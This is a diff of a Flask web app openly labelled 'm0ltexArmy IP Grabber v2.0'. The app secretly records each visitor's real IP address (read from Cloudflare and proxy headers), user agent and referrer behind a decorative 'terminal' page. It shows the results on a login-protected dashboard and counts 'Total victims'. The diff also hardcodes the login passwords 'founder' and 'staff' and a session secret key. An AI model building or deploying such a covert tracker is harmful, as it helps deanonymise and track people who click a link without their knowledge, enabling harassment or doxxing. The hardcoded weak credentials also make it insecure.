@@ -1,6 +1,5 @@
-from flask import Flask, request, session, redirect, jsonify
+from flask import Flask, request, session, redirect
 from flask_socketio import SocketIO, emit
-from datetime import datetime
 import sqlite3
 import os
 import hashlib
@@ -11,12 +10,11 @@ app.secret_key = "m0ltex_final_secret_2026"
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 # ======================
-# 💾 DATABASE
+# DATABASE
 # ======================
 def init_db():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
-    
     c.execute("""CREATE TABLE IF NOT EXISTS visits (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     ip TEXT,
@@ -32,42 +30,24 @@ def init_db():
                     visits INTEGER DEFAULT 1,
                     user_agent TEXT
                 )""")
-    
     conn.commit()
     conn.close()
 
 init_db()
 
-# 🔐 LOGIN (lepší bezpečnost)
-USERS = {
-    "FOUNDER123": hashlib.sha256("founder".encode()).hexdigest(),
-    "STAFF123": hashlib.sha256("staff".encode()).hexdigest()
-}
-
-online_users = 0
-
 # ======================
-# Helper funkce pro IP
+# HELPER - REAL IP
 # ======================
 def get_real_ip():
-    headers = [
-        'X-Forwarded-For',
-        'X-Real-IP',
-        'CF-Connecting-IP',      # Cloudflare
-        'True-Client-IP',
-        'X-Client-IP'
-    ]
-    
+    headers = ['CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP', 'True-Client-IP', 'X-Client-IP']
     for header in headers:
         ip = request.headers.get(header)
         if ip:
-            # Bere první IP pokud je více (proxy chain)
             return ip.split(',')[0].strip()
-    
     return request.remote_addr
 
 # ======================
-# 🌐 HOME - IP GRABBER
+# HOME - IP GRABBER
 # ======================
 @app.route("/")
 def home():
@@ -80,20 +60,18 @@ def home():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
     
-    # Log každou návštěvu
     c.execute("INSERT INTO visits (ip, user_agent, referrer) VALUES (?, ?, ?)",
               (ip, ua_string, referrer))
     
-    # Unique visits logika
     c.execute("""INSERT INTO unique_visits (ip, first_visit, last_visit, visits, user_agent)
                  VALUES (?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, ?)
                  ON CONFLICT(ip) DO UPDATE SET 
-                 last_visit = CURRENT_TIMESTAMP,
-                 visits = visits + 1""", (ip, ua_string))
+                 last_visit = CURRENT_TIMESTAMP, visits = visits + 1""", 
+                 (ip, ua_string))
     
     conn.commit()
     conn.close()
-    
+
     return """
 <html>
 <head>
@@ -113,7 +91,7 @@ def home():
 <canvas id="rain"></canvas>
 <div class="sidebar">
     <h1 class="red">ᴍ𝟘ʟᴛᴇ𝔁𝔸𝕣𝕞𝕪</h1>
-    <a href="/login" style="color:#0f0;">→ Login</a>
+    <a href="/login" style="color:#0f0; text-decoration:none;">→ Login</a>
 </div>
 <div class="main">
     <h1 class="red">REALTIME TERMINAL v2.0</h1>
@@ -156,11 +134,9 @@ function draw() {
     ctx.fillRect(0, 0, c.width, c.height);
     ctx.fillStyle = "#f00";
     ctx.font = fontSize + "px monospace";
-    
     for (let i = 0; i < drops.length; i++) {
         const text = chars[Math.floor(Math.random() * chars.length)];
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        
         if (drops[i] * fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
     }
@@ -173,7 +149,7 @@ window.addEventListener("resize", () => location.reload());
 """
 
 # ======================
-# LOGIN + DASHBOARD
+# LOGIN
 # ======================
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -181,10 +157,12 @@ def login():
         key = request.form.get("key")
         if key:
             hashed = hashlib.sha256(key.encode()).hexdigest()
-            for real_key, real_hash in USERS.items():
-                if real_hash == hashed:
-                    session["role"] = real_key.lower()
-                    return redirect("/dashboard")
+            if hashed == hashlib.sha256("founder".encode()).hexdigest():
+                session["role"] = "founder"
+                return redirect("/dashboard")
+            elif hashed == hashlib.sha256("staff".encode()).hexdigest():
+                session["role"] = "staff"
+                return redirect("/dashboard")
     return """
     <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px;">
     <h1 class="red">m0ltexArmy - LOGIN</h1>
@@ -195,6 +173,9 @@ def login():
     </body>
     """
 
+# ======================
+# DASHBOARD
+# ======================
 @app.route("/dashboard")
 def dashboard():
     if "role" not in session:
@@ -202,19 +183,12 @@ def dashboard():
     
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
-    
-    c.execute("SELECT COUNT(*) FROM visits")
-    total = c.fetchone()[0]
-    
-    c.execute("SELECT COUNT(*) FROM unique_visits")
-    unique = c.fetchone()[0]
-    
-    c.execute("""SELECT ip, user_agent, referrer, timestamp 
-                 FROM visits ORDER BY timestamp DESC LIMIT 50""")
+    c.execute("SELECT COUNT(*) FROM visits"); total = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM unique_visits"); unique = c.fetchone()[0]
+    c.execute("SELECT ip, user_agent, referrer, timestamp FROM visits ORDER BY timestamp DESC LIMIT 50")
     logs = c.fetchall()
-    
     conn.close()
-    
+
     logs_html = "<br>".join([f"<b>{ip}</b> | {time} | {ua[:60]}..." for ip, ua, ref, time in logs])
     
     return f"""
@@ -232,14 +206,14 @@ def dashboard():
 
 @app.route("/export")
 def export():
-    if "role" not in session:
-        return redirect("/login")
-    # Zde můžeš přidat CSV export později
-    return "Export feature coming soon..."
+    if "role" not in session: return redirect("/login")
+    return "Export coming soon..."
 
 # ======================
 # SOCKETIO
 # ======================
+online_users = 0
+
 @socketio.on("connect")
 def handle_connect():
     global online_users
@@ -261,8 +235,8 @@ def handle_command(cmd):
         emit("message", f"Role: {role} | Online: {online_users}")
     elif cmd == "/clear":
         emit("message", "<span style='color:#f00;'>Terminal cleared.</span>")
-    elif cmd == "/stats" and role == "founder123":
-        emit("message", "Founder mode active - full access")
+    elif cmd == "/stats":
+        emit("message", f"Total victims: {online_users}")
     else:
         emit("message", f"Unknown command: {cmd}")
 
@@ -275,5 +249,5 @@ def logout():
 # RUN
 # ======================
 if __name__ == "__main__":
-    print("m0ltexArmy IP Grabber v2.0 - Started")
+    print("✅ m0ltexArmy IP Grabber v2.0 - Started")
     socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False)
